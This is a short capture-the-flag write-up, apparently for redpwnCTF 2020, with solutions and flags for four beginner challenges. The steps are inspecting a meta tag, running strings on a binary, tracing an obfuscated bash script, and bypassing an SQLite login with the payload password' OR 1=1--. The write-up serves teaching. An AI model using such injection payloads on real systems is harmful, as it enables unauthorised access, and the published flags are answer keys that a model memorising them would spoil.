# web/inspector-general - flag{1nspector_g3n3ral_at_w0rk}

Inspect page elements, flag is there
```
<meta name="redpwnctf2020" content="flag{1nspector_g3n3ral_at_w0rk}">
```

# rev/ropes - flag{r0pes_ar3_just_l0ng_str1ngs}
- using strings gives you the flag
```
/usr/lib/libSystem.B.dylib
Give me a magic number: 
First part is: flag{r0pes_ar3_
Second part is: just_l0ng_str1ngs}
@dyld_stub_binder
@_printf
@_puts
```

# web/login - flag{0bl1g4t0ry_5ql1}

Use basic SQL Injection in the password. comment end of query with -- (sqlite)
```
user: whatever_you_want
password: password' OR 1=1--
```

Pop-up with the flag appears


# misc/uglybash - flag{us3_zsh,_dummy}

If we open the script, it's basically obfuscated code, so it'll be impossible to simply find the flag.

However, we can run the script in `DEBUG` mode with `-x` and it will print every line evaluation, along with the flag!

```
bash -x cmd.sh
```

Flag can be seen at the last line, or can be rebuilt looking at the printf commands

